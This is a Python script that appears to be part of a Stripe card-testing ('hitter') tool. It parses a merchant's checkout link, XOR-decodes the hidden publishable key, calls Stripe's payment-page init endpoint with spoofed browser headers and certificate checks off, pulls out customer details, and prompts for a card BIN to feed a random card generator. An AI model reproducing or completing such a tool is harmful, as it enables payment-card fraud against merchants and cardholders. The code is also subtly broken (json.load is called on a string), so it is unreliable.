import json
import requests
from gen import generate_random_cc

def get_json_response(data):
    checkout_link = data
    if not checkout_link:
        return None

    url = checkout_link.split('#')[1]
    cs = get_str(checkout_link, 'pay/', '#')
    pk = get_str(xor_string(bytes(url, 'utf-8').decode('utf-8'), 5), '"apiKey":"', '"')
    site = get_str(xor_string(bytes(url, 'utf-8').decode('utf-8'), 5), '"referrerOrigin":"', '"')

    headers = {
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; M1901F7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }

    payload = {
        'key': pk,
        'eid': 'NA',
        'browser_locale': 'en-US',
        'redirect_type': 'stripe_js'
    }

    response = requests.post(f'https://api.stripe.com/v1/payment_pages/{cs}/init', headers=headers, data=payload, auth=(pk, ''), verify=False)

    if 'No such payment_page' in response.text:
        print('Expired Link')
        return None

    name = get_str(response.text, '"display_name": "', '"')
    email = get_str(response.text, '"customer_email": "', '"')
    cur = get_str(response.text, '"currency": "', '"')
    amt = get_str(response.text, '"amount": ', ',') or get_str(response.text, '"total": ', ',') or '____'
    name = name or '____'
    pk = pk or '____'
    site = site or '____'
    cs = cs or '____'
    cur = cur or '____'
    email = email or 'Email not found'

    data = {
        'name': name,
        'pklive': pk,
        'cslive': cs,
        'amount': amt,
        'email': email
    }

    return json.dumps(data)


def get_str(string, start, end):
    str_ = string.split(start)[1].split(end)[0]
    return str_


def xor_string(text, key):
    if isinstance(key, int):
        key = [key]

    output = ''
    for i, char in enumerate(text):
        c = ord(char)
        k = key[i % len(key)]
        output += chr(c ^ k)

    return output

livekey = input("your stripe checkout link:")
binl = input("Enter Bin:")
print("starting checkout")
dataa = json.load(get_json_response(livekey))
cs = dataa['cslive']
pk = dataa['pklive']
email = dataa['email']
amount = dataa['amount']

